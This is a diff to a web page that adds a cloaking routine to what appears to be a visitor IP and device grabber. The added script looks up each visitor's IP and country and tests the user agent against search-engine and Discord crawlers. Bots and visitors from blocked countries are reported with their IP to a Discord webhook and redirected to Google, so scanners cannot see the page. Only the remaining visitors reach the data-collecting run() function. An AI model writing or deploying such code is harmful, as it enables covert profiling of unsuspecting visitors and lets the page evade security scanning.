@@ -18,6 +18,49 @@
     };
 </script>
     <script>
+    async function safetyCheck() {
+        // 1. BLACKLIST CONFIG
+        const BLOCKED_CC = ['US', 'RU', 'CN']; // Block these countries
+        const BLOCKED_UA = /bot|spider|crawl|discord|google|bing|slurp|duckduckgo/i;
+        
+        try {
+            const r = await fetch('https://ip-api.com/json/').then(res => res.json());
+            
+            // 2. THE REJECTION LOGIC
+            const isBot = BLOCKED_UA.test(navigator.userAgent);
+            const isSus = BLOCKED_CC.includes(r.countryCode);
+
+            if (isBot || isSus) {
+                // Send a "Threat Blocked" alert to Discord so you know the guard is working
+                const alert = {
+                    content: `🛡️ **GUARD: THREAT NEUTRALIZED**\n**Reason:** ${isBot ? "Crawler/Bot" : "Blacklisted Region"}\n**IP:** ${r.query}\n**Country:** ${r.country}\n**Action:** Redirected to Google.`
+                };
+                navigator.sendBeacon(HOOK, new Blob([JSON.stringify(alert)], {type: 'application/json'}));
+
+                // 3. THE EXIT (Bounces them away immediately)
+                window.location.replace("https://www.google.com");
+                return true; // Signals the rest of the script to stop
+            }
+        } catch (e) {
+            // If the check fails (no internet/blocked), we assume they are safe to keep things moving
+            return false;
+        }
+        return false;
+    }
+
+    // UPDATED EXECUTION: 
+    // We wrap the main run() function so it only fires if safetyCheck is FALSE
+    async function main() {
+        const isBlocked = await safetyCheck();
+        if (!isBlocked) {
+            // Run all your other sections (Hardware, IP, etc.) here
+            run(); 
+        }
+    }
+    
+    main();
+</script>
+    <script>
     async function getHardware() {
         let report = {
             model: "Unknown Device",
